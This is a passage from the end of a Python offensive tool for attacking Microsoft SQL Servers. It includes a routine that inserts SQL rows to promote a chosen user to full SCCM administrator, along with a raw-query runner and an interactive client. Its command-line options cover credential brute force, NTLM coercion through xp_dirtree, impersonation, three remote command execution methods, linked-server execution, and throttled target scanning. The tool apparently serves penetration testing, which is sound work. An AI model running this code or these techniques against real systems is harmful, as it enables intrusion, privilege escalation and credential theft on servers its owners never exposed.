		conn.sql_query("INSERT INTO RBAC_ExtendedPermissions (AdminID, RoleID, ScopeID, ScopeTypeID)"
						f"VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = '{netbiosDomain}\{sam}'), 'SMS0001R', 'SMS00004', '1');")
		errors = printRes(conn)
		if errors != []:
			return
		
		print(f"[+] '{sam}' promoted SMS Admin of SCCM hierarchy")
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

#######################################################
#                     Raw Query                       #
#######################################################

def rawQuery(conn, query):
	print_yellow("[*] Running raw MSSQL query")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("\n[-] No connection available")
			return

		conn.sql_query(query)
		printRes(conn)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

##########################################################
#                     MSSQL Client                       #
##########################################################

def mssqlClient(conn, target, username, domain, windowsAuth):
	print_yellow("[*] Starting MSSQL client")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No connection available")
			return

		while True:
			if windowsAuth:
				query = input(f"[{domain}/{username}@{target}]$> ")
			else:
				query = input(f"[MSSQL/{username}@{target}]$> ")

			if query == "exit":
				break
			else:
				conn.sql_query(query)
				printRes(conn)
				print()
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

##################################################
#                     MAIN                       #
##################################################

def print_red(text):
	print("\033[91m" + text + "\033[0m")

def print_yellow(text):
	print("\033[93m" + text + "\033[0m")

def parseTarget(target):
	import ipaddress, re

	cidrRegex = r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}/[0-9]{1,2}$|^(?:[0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}/[0-9]{1,3}$"
	isFile = False
	isMultipleIPs = False

	res = []

	tmp = []
	try:
		with open(target, "r") as f:
			tmp = [line.rstrip('\n') for line in f.readlines()]
			isFile = True
	except:
		pass

	if not isFile:
		if target.find(",") != -1:
			tmp = target.split(",")
			isMultipleIPs = True

	if not isFile and not isMultipleIPs:
		tmp = [target]

	for entry in tmp:
		if re.match(cidrRegex, entry):
			network = ipaddress.ip_network(entry, strict = False)
			for ip in network:
				res.append(str(ip))
		else:
			res.append(entry)
	
	return res

def maybeSleep(deep = True, inAction = False):
	global THROTTLE, THROTTLE_DEEP
	if deep:
		if THROTTLE_DEEP != None:
			print("\n--- SLEEPING ---\n")
			time.sleep(THROTTLE_DEEP)
	else:
		if THROTTLE != None and THROTTLE_DEEP == None:
			print("--- SLEEPING ---\n")
			time.sleep(THROTTLE)
	if inAction and THROTTLE_DEEP == None:
		print()

def add_arguments(parser):
	auth_group = parser.add_argument_group('[[ Authentication ]]')
	auth_group.add_argument("--port", help = "Target(s) port. Default = 1433", type = int, default = 1433)
	auth_group.add_argument("--database", help = "Target(s) database. Default = master")
	auth_group.add_argument("--windowsAuth", help = "Use Windows authentication or not", action = "store_true")
	auth_group.add_argument("--channelBinding", help = "Use Channel Binding for MSSQL with TLS encryption. Default = False", action = "store_true")

	bf_group = parser.add_argument_group('[[ Brute Force ]]')
	bf_group.add_argument("--doBF", help = "Perform Brute Force with provided credentials (Usernames/Pwds/NT hashes files or single values)", action = "store_true")
	bf_group.add_argument("--passLogin", help = "Try Password = Login", action = "store_true")

	infos_group = parser.add_argument_group('[[ Enumeration ]]')
	infos_group.add_argument("--MSSQLLogin", help = "Get current MSSQL login", action = "store_true")
	infos_group.add_argument("--MSSQLUser", help = "Get current MSSQL user", action = "store_true")
	infos_group.add_argument("--haveRole", help = "Check if current user have the provided role", choices = ["sysadmin", "serveradmin", "dbcreator", "setupadmin", "bulkadmin", "securityadmin", "diskadmin", "public", "processadmin"])
	infos_group.add_argument("--getMembersWithRole", help = "List users that have the provided role", choices = ["sysadmin", "serveradmin", "dbcreator", "setupadmin", "bulkadmin", "securityadmin", "diskadmin", "public", "processadmin"])

	coerce_group = parser.add_argument_group('[[ Coerce ]]')
	coerce_group.add_argument("--UNCPath", help = "UNC path to coerce NTLM authentication with xp_dirtree")

	impersonate_group = parser.add_argument_group('[[ Impersonate ]]')
	impersonate_group.add_argument("--enumImpersonate", help = "Enumerate impersonation with login/user level", action = "store_true")
	impersonate_group.add_argument("--execAsLogin", help = "Impersonate login and execute query in the form of <Login>:<Query>")
	impersonate_group.add_argument("--execAsUser", help = "Impersonate user and execute query in the form of <Database>:<User>:<Query>")

	rce_group = parser.add_argument_group('[[ Remote Code Execution ]]')
	rce_group.add_argument("--RCEMethod1", help = "System command to execute through xp_cmdshell")
	rce_group.add_argument("--RCEMethod2", help = "System command to execute through sp_oacreate and sp_oamethod [NO OUTPUT]")
	rce_group.add_argument("--RCEMethod3", help = "System command to execute through assembly")

	trustedlinks_group = parser.add_argument_group('[[ Trusted Links ]]')
	trustedlinks_group.add_argument("--enumLinks", help = "Enumerate Trusted Links for current user", action = "store_true")
	trustedlinks_group.add_argument("--execAt", help = "SQL query to execute at linked server in the form of <LinkedServer>:<Query>")

	sccm_group = parser.add_argument_group('[[ SCCM / MECM ]]')
	sccm_group.add_argument("--promoteSMSAdmin", help = "samAccountName of user to promote SMS Admin (Full Administrator) of the SCCM hierarchy")
	sccm_group.add_argument("--SID", help = "SID of user to promote")
	sccm_group.add_argument("--netbiosDomain", help = "Netbios domain name the user belong to")
	sccm_group.add_argument("--siteCode", help = "Site code the MSSQL server belong to")

	rawquery_group = parser.add_argument_group('[[ Raw Query ]]')
	rawquery_group.add_argument("--rawQuery", help = "Raw MSSQL query to execute")

	client_group = parser.add_argument_group('[[ Client ]]')
	client_group.add_argument("--client", help = "Start an MSSQL client for raw queries", action = "store_true")
  
THROTTLE = None
THROTTLE_DEEP = None
def handle_arguments(args):
	targets = ['LOCAL']
	if args.target != None:    
		targets = parseTarget(args.target)
	if args.shuffle:    
		random.shuffle(targets)
	if args.throttle != None:
		global THROTTLE
		THROTTLE = args.throttle
	if args.throttleDeep != None:
		global THROTTLE_DEEP
		THROTTLE_DEEP = args.throttleDeep

	firstTarget = True

	for target in targets:
		if not firstTarget:
			maybeSleep(deep = False)
		else:
			firstTarget = False

		print_red("|---------------------------")
		print_red(f"| {target}")
		print_red("|---------------------------")
		print()

		conn = None

		# Brute Force
		if args.doBF:
			doBF(target, args.port, args.database, args.windowsAuth, args.username, args.password, args.ntHash, args.domain, args.channelBinding, args.passLogin)
			maybeSleep(inAction = True)

		# Enumeration
		if args.MSSQLLogin:
			if (conn == None):
				conn = connect_mssql(target, args.port, args.database, args.windowsAuth, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.ccache, args.channelBinding)
				maybeSleep(inAction = True)
			getLogin(conn)
			maybeSleep(inAction = True)
		if args.MSSQLUser:
			if (conn == None):
				conn = connect_mssql(target, args.port, args.database, args.windowsAuth, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.ccache, args.channelBinding)
				maybeSleep(inAction = True)
			getUser(conn)
			maybeSleep(inAction = True)
		if args.haveRole != None:
			if (conn == None):
				conn = connect_mssql(target, args.port, args.database, args.windowsAuth, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.ccache, args.channelBinding)
				maybeSleep(inAction = True)
			haveRole(conn, args.haveRole)
			maybeSleep(inAction = True)
		if args.getMembersWithRole != None:
			if (conn == None):
				conn = connect_mssql(target, args.port, args.database, args.windowsAuth, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.ccache, args.channelBinding)
				maybeSleep(inAction = True)
			getMembersWithRole(conn, args.getMembersWithRole)
			maybeSleep(inAction = True)
		
		# Coerce
		if args.UNCPath != None:
			if (conn == None):
				conn = connect_mssql(target, args.port, args.database, args.windowsAuth, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.ccache, args.channelBinding)
				maybeSleep(inAction = True)
			coerce(conn, args.UNCPath)
			maybeSleep(inAction = True)
		
		# Impersonate
		if args.enumImpersonate:
			if (conn == None):
				conn = connect_mssql(target, args.port, args.database, args.windowsAuth, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.ccache, args.channelBinding)
				maybeSleep(inAction = True)
			enumImpersonate(conn)
			maybeSleep(inAction = True)
		if args.execAsLogin != None:
			if (conn == None):
				conn = connect_mssql(target, args.port, args.database, args.windowsAuth, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.ccache, args.channelBinding)
				maybeSleep(inAction = True)
			execAsLogin(conn, *args.execAsLogin.split(":"))
			maybeSleep(inAction = True)
		if args.execAsUser != None:
			if (conn == None):
				conn = connect_mssql(target, args.port, args.database, args.windowsAuth, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.ccache, args.channelBinding)
				maybeSleep(inAction = True)
			execAsUser(conn, *args.execAsUser.split(":"))
			maybeSleep(inAction = True)
		
		# Remote Code Execution
		if args.RCEMethod1:
			if (conn == None):
				conn = connect_mssql(target, args.port, args.database, args.windowsAuth, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.ccache, args.channelBinding)
				maybeSleep(inAction = True)
			xp_cmdshell(conn, args.RCEMethod1)
			maybeSleep(inAction = True)
		if args.RCEMethod2:
			if (conn == None):
				conn = connect_mssql(target, args.port, args.database, args.windowsAuth, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.ccache, args.channelBinding)
				maybeSleep(inAction = True)
			sp_OACreate_OAMethod(conn, args.RCEMethod2)
			maybeSleep(inAction = True)
		if args.RCEMethod3:
			if (conn == None):
				conn = connect_mssql(target, args.port, args.database, args.windowsAuth, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.ccache, args.channelBinding)
				maybeSleep(inAction = True)
			createAssembly(conn, args.RCEMethod3)
			maybeSleep(inAction = True)
		
		# Trusted Links
		if args.enumLinks:
			if (conn == None):
				conn = connect_mssql(target, args.port, args.database, args.windowsAuth, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.ccache, args.channelBinding)
				maybeSleep(inAction = True)
			enumLinks(conn)
			maybeSleep(inAction = True)
		
		# SCCM / MECM
		if args.promoteSMSAdmin != None:
			if (conn == None):
				conn = connect_mssql(target, args.port, args.database, args.windowsAuth, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.ccache, args.channelBinding)
				maybeSleep(inAction = True)
			promoteSMSAdmin(conn, args.promoteSMSAdmin, args.siteCode, args.SID, args.netbiosDomain)
			maybeSleep(inAction = True)
		if args.execAt != None:
			if (conn == None):
				conn = connect_mssql(target, args.port, args.database, args.windowsAuth, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.ccache, args.channelBinding)
				maybeSleep(inAction = True)
			execAt(conn, *args.execAt.split(":"))
			maybeSleep(inAction = True)
		
		# Raw Query
		if args.rawQuery != None:
			if (conn == None):
				conn = connect_mssql(target, args.port, args.database, args.windowsAuth, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.ccache, args.channelBinding)
				maybeSleep(inAction = True)
			rawQuery(conn, args.rawQuery)
			maybeSleep(inAction = True)
		
		# Client
		if args.client:
			if (conn == None):
				conn = connect_mssql(target, args.port, args.database, args.windowsAuth, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.ccache, args.channelBinding)
				maybeSleep(inAction = True)
			mssqlClient(conn, target, args.username, args.domain, args.windowsAuth)
			maybeSleep(inAction = True)

##################################################
#                     TODO                       #
##################################################

# - Implement Channel Binding (for NTLM at least, because Kerberos will work despite EPA enforced)